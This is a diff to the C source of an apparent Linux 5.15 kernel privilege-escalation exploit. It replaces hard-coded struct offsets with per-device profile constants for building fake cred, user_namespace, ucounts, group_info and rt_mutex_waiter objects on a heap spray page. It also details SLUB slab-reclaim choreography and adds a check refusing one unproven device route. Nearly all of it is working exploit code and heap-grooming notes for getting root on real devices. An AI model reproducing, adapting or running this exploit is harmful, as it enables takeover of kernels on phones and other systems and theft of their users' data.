@@ -611,7 +611,7 @@ void prepare_ctxs(void) {
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
 }
 
-/* Fake cred suite for mode 6 (cred swap). Fills the 5.15.170-accurate
+/* Fake cred suite for mode 6 (cred swap). Fills the active profile's
  * struct cred plus the auxiliary objects the kernel dereferences through
  * it (security blob, user_struct, ucounts, group_info) - all on the spray
  * page. Uses a self-contained fake user_namespace on the spray page:
@@ -628,8 +628,8 @@ uint32_t g_fake_sid = 1; /* initial sid guess: 1 = kernel; brute-forceable
  * capable(), and is visible under /proc hidepid=invisible,gid=3009. */
 int g_fake_ngrps = 0;
 uint32_t g_fake_grps[16];
-/* the current attempt's MOVABLE-storm region (freed at the next
- * prepare_kernel_page entry: 2GB RAM cannot stack multiple storms) */
+/* The current attempt's MOVABLE-storm region, freed at the next
+ * prepare_kernel_page entry on profiles whose reclaim route is enabled. */
 static void *g_storm_region;
 static size_t g_storm_size;
 
@@ -674,55 +674,46 @@ static void fill_fake_cred_suite(unsigned char *p, uintptr_t payload_base) {
   put64(c, CRED15_GROUP_INFO_OFF, payload_base + FAKE_GROUP_INFO_OFF);
 
   unsigned char *b = p + FAKE_SEC_BLOB_OFF;
-  memset(b, 0, 0x40);
-  put32(b, 0, 0);
-  put32(b, 4, g_fake_sid);
+  memset(b, 0, TASK_SECURITY_SIZE);
+  put32(b, TASK_SECURITY_OSID_OFF, 0);
+  put32(b, TASK_SECURITY_SID_OFF, g_fake_sid);
 
   unsigned char *u = p + FAKE_USER_STRUCT_OFF;
-  memset(u, 0, 0x80);
-  put32(u, 0, 0x1000);
+  memset(u, 0, USER_STRUCT_SIZE);
+  put32(u, USER_STRUCT_COUNT_OFF, 0x1000);
 
   /* fake user_namespace: identity uid/gid maps, level=0, parent=NULL,
    * ucounts=NULL (terminates the inc_rlimit_ucounts loop). cap_capable
    * matches on the first iteration (ns == cred->user_ns) and never
    * dereferences parent. */
   unsigned char *ns = p + FAKE_USER_NS_OFF;
-  memset(ns, 0, 0x100);
-  /* uid_map @0x00: {nr_extents=1, extent[0]={first=0,lower_first=0,count=0xFFFFFFFF}} */
-  put32(ns, 0x00, 1);              /* uid_map.nr_extents */
-  put32(ns, 0x04, 0);              /* extent[0].first */
-  put32(ns, 0x08, 0);              /* extent[0].lower_first */
-  put32(ns, 0x0C, 0xFFFFFFFF);     /* extent[0].count */
-  /* gid_map @0x40 */
-  put32(ns, 0x40, 1);
-  put32(ns, 0x44, 0);
-  put32(ns, 0x48, 0);
-  put32(ns, 0x4C, 0xFFFFFFFF);
-  /* projid_map @0x80 */
-  put32(ns, 0x80, 1);
-  put32(ns, 0x84, 0);
-  put32(ns, 0x88, 0);
-  put32(ns, 0x8C, 0xFFFFFFFF);
-  /* parent @0xC0 = NULL, level @0xC8 = 0, owner @0xCC = 0, group @0xD0 = 0 */
-  /* ns.count @0xEC (inside struct ns_common) */
-  put32(ns, 0xEC, 0x100);
-  /* ucounts = NULL (already zero from memset) -- loop terminator */
-  /* ucount_max[0..] and rlimit_max[0..] = LONG_MAX: fill generously past
-   * the ucounts pointer. Offset varies by config, but filling 0xF0..0x1F0
-   * with LONG_MAX covers all plausible layouts. */
-  for (int i = 0xF8; i < 0x100; i += 8)
-    put64(ns, i, 0x7FFFFFFFFFFFFFFFULL);
+  memset(ns, 0, USER_NS_SIZE);
+  const size_t map_bases[] = {
+      0, USER_NS_GID_MAP_OFF, USER_NS_PROJID_MAP_OFF,
+  };
+  for (size_t mi = 0; mi < sizeof(map_bases) / sizeof(map_bases[0]); mi++) {
+    unsigned char *map = ns + map_bases[mi];
+    put32(map, UID_GID_MAP_NR_EXTENTS_OFF, 1);
+    put32(map, UID_GID_MAP_EXTENT_OFF + 0, 0);
+    put32(map, UID_GID_MAP_EXTENT_OFF + 4, 0);
+    put32(map, UID_GID_MAP_EXTENT_OFF + 8, 0xffffffffU);
+  }
+  /* parent/level/owner/group and user_ns->ucounts remain zero. */
+  put32(ns, USER_NS_NS_OFF + NS_COMMON_COUNT_OFF, 0x100);
+  for (unsigned i = 0; i < USER_NS_UCOUNT_MAX_COUNT; i++)
+    put64(ns, USER_NS_UCOUNT_MAX_OFF + i * sizeof(uint64_t),
+          0x7fffffffffffffffULL);
 
   /* fake ucounts: ns = fake_ns, count big, rlimit counters zero */
   unsigned char *uc = p + FAKE_UCOUNTS_OFF;
-  memset(uc, 0, 0x100);
-  put64(uc, 0x10, fake_ns_addr);   /* ns = fake_ns (on spray page) */
-  put32(uc, 0x1C, 0x40000);        /* count (big, never reaches 0) */
+  memset(uc, 0, UCOUNTS_SIZE);
+  put64(uc, UCOUNTS_NS_OFF, fake_ns_addr);
+  put32(uc, UCOUNTS_COUNT_OFF, 0x40000);
 
   unsigned char *g = p + FAKE_GROUP_INFO_OFF;
-  memset(g, 0, 0x20);
-  put32(g, 0, 0x100);
-  put32(g, 4, 0);
+  memset(g, 0, GROUP_INFO_GID_OFF + 16 * sizeof(uint32_t));
+  put32(g, GROUP_INFO_USAGE_OFF, 0x100);
+  put32(g, GROUP_INFO_NGROUPS_OFF, 0);
   if (env_flag("GHOST_GROUPS", 1)) {
     /* 5.15 group_info: { atomic_t usage; int ngroups; kgid_t blocks[]; }
      * - blocks is a flat flexible array at +8, and groups_search()
@@ -755,9 +746,9 @@ static void fill_fake_cred_suite(unsigned char *p, uintptr_t payload_base) {
     int m = 0;
     for (int i = 0; i < n; i++)
       if (m == 0 || sg[i] != sg[m-1]) sg[m++] = sg[i];
-    put32(g, 4, (uint32_t)m);
+    put32(g, GROUP_INFO_NGROUPS_OFF, (uint32_t)m);
     for (int i = 0; i < m; i++)
-      put32(g, 8 + 4*i, sg[i]);
+      put32(g, GROUP_INFO_GID_OFF + 4*i, sg[i]);
   }
 }
 
@@ -879,19 +870,17 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF, fake_w0);
+      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8, fake_w0);
+      put64(p, LOCK_OFF + RT_MUTEX_OWNER_OFF, fake_task | 1);
     } else {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF, fake_w0);
+      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8, fake_w0);
+      put64(p, LOCK_OFF + RT_MUTEX_OWNER_OFF, fake_task | 1);
     }
 
-    /* W0: fake rt_mutex_waiter on the spray page, REAL 5.15.170 layout
-     * (rtmutex_common.h): 0x00 tree_entry, 0x18 pi_tree_entry, 0x30 task,
-     * 0x38 lock, 0x40 wake_state(4B), 0x44 prio(4B), 0x48 deadline,
-     * 0x50 ww_ctx.
+    /* W0: fake rt_mutex_waiter on the spray page. Field offsets are
+     * selected from the active profile (exact V643 BTF for TCL).
      *
      * tree_entry IS dereferenced as a tree node: fake_lock->waiters.rb_root
      * points at it (payload below), so the [7] rt_mutex_enqueue inserts the
@@ -904,22 +893,22 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, W0_OFF + 0x00, 0);
     put64(p, W0_OFF + 0x08, 0);
     put64(p, W0_OFF + 0x10, 0);
-    put64(p, W0_OFF + 0x18, write_pc);         /* pi_tree_entry.__rb_parent_color */
-    put64(p, W0_OFF + 0x20, write_right);      /* pi_tree_entry.rb_right */
-    put64(p, W0_OFF + 0x28, write_left);       /* pi_tree_entry.rb_left */
-    put64(p, W0_OFF + 0x30, waiter_task);      /* task */
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF, write_pc);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 8, write_right);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 16, write_left);
+    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
     /* W0.lock must equal the walk's lock pointer (rt_mutex_top_waiter's
      * BUG_ON(w->lock != lock)): fake_lock normally, the CAL_LOCK_REL
      * second-copy lock when the identity diagnostic is active. */
     {
       const char *clr = getenv("CAL_LOCK_REL");
-      put64(p, W0_OFF + 0x38,
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF,
             clr ? payload_base + strtoull(clr, NULL, 0) : fake_lock);
     }
-    put32(p, W0_OFF + 0x40, 0);                /* wake_state = TASK_NORMAL */
-    put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
-    put64(p, W0_OFF + 0x48, 0);                /* deadline */
-    put64(p, W0_OFF + 0x50, 0);                /* ww_ctx */
+    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+    put32(p, W0_OFF + FAKE_WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, W0_OFF + FAKE_WAITER_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
 
     /* usage=2: the walk's [10] get_task_struct (2->3) and the final
      * put_task_struct (3->2) stay balanced and far from zero, so the
@@ -931,7 +920,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     /* Set fake_task->cpu to a non-zero CPU so the walk's task_rq_lock
      * grabs a different rq than the main thread's (avoids starving main
      * off CPU 0 when the walk holds cpu_rq(0)->lock). */
-    put32(p, FAKE_TASK_OFF + 0x58, 3);
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_CPU_OFF, 3);
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       /* pi_waiters empty for all FOPS modes: the dequeue_pi erase of W0
        * only consults W0.pi_tree_entry's own fields (parent != NULL so
@@ -1101,9 +1090,18 @@ static int reclaim_one_uring(int tag) {
 }
 
 uintptr_t prepare_kernel_page(int payload_mode) {
+  /* Independent safety barrier: even if analysis_only were accidentally
+   * removed later, never run the Sabrina-specific SLUB/PCP choreography for
+   * TCL until that route has its own measured profile. */
+  if (active_offsets &&
+      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_UNPROVEN) {
+    errno = ENOTSUP;
+    pr_error("TCL V643 reclaim route is not dynamically proven; refusing page preparation\n");
+    return 0;
+  }
   close_reclaim_sockets();
-  /* Free the PREVIOUS attempt's MOVABLE-storm region (2GB RAM - a new
-   * attempt would otherwise stack another 128MB and OOM the device). */
+  /* Reference/Sabrina route only. Free the previous attempt's MOVABLE-storm
+   * region so another large allocation is not stacked on top of it. */
   if (g_storm_region && g_storm_size) {
     munmap(g_storm_region, g_storm_size);
     if (uring_count > 0 && uring_maps[uring_count - 1] == g_storm_region) {
@@ -1340,8 +1338,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   /* ---- Reclaim kill phase (bug #7 fix): empty the target slab page
    * and force SLUB to DISCARD it to the page allocator, deterministically.
    *
-   * mm_cachep: order-2 slabs, 16 objects of 976 bytes, cpu_partial = 13,
-   * min_partial = 5 (ilog2(976)/2 clamped to MIN_PARTIAL).
+   * Reference/Sabrina measurements: mm_cachep used order-2 slabs and its
+   * observed CPU/node-partial thresholds drove this choreography. These
+   * thresholds are not assumed for TCL V643; its route is refused above.
    *
    * With CONFIG_SLUB_CPU_PARTIAL=y the fate of a fully-freed page is:
    *  - freed into a FULL page (first free): __slab_free sets new.frozen
@@ -1496,8 +1495,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
    * like an RB_EMPTY_NODE (__rb_parent_color == its own address) in the
    * payload buffer before ANY copy (io_uring or skb). */
   if (env_int_range("GHOST_TEST", 0, 0, 1) == 1) {
-    put64(skb_buf, W0_OFF + 0x18,
-          (last_mm_struct & ~(MM_SLAB_SIZE - 1)) + W0_OFF + 0x18);
+    put64(skb_buf, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF,
+          (last_mm_struct & ~(MM_SLAB_SIZE - 1)) + W0_OFF +
+              FAKE_WAITER_PI_TREE_ENTRY_OFF);
   }
 
   /* PCP DRAIN BURST: the discarded target page is only reliably
